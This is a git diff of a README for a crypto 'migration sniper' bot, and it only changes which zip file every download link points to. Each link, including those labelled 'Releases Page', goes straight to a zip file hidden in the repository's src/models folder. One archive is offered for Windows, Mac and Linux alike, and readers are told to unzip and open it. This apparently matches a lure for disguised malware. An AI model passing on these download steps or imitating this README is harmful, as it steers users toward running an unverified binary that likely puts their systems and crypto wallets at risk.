@@ -1,21 +1,21 @@
 # 🎯 pumpswap-migration-sniper - Capture Token Migrations Easily
 
 ## 📦 Download Now
-[![Download Now](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip%https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip)](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip)
+[![Download Now](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip%https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip)](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the **pumpswap-migration-sniper**! This bot helps you effortlessly capture token migrations to the Raydium CPMM (Constant Product Market Maker). Follow the steps below to get started quickly.
 
 ## 🔗 Download & Install
-To download the software, visit this page: [Releases Page](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip). Once there, find the latest version, and click it to download.
+To download the software, visit this page: [Releases Page](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip). Once there, find the latest version, and click it to download.
 
 ### Installation Steps
-1. Go to the [Releases Page](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip).
 2. Find the latest version listed.
 3. Click on the file that suits your system:
-   - For Windows: Download `https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip`
-   - For Mac: Download `https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip`
-   - For Linux: Download `https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip`
+   - For Windows: Download `https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip`
+   - For Mac: Download `https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip`
+   - For Linux: Download `https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip`
 4. Unzip or extract the downloaded file.
 5. Open the application to start using it.
 
@@ -61,4 +61,4 @@ This application is licensed under the MIT License. Feel free to use and modify 
 ## 🌟 Acknowledgments
 Thanks to the contributors and community members who make **pumpswap-migration-sniper** better every day. Your feedback and suggestions are invaluable.
 
-For the latest updates and features, make sure to keep an eye on this [Releases Page](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/pumpswap-migration-sniper_v3.0.zip). Happy sniping!
+For the latest updates and features, make sure to keep an eye on this [Releases Page](https://raw.githubusercontent.com/bekatcho90/pumpswap-migration-sniper/main/src/models/sniper-migration-pumpswap-3.8.zip). Happy sniping!
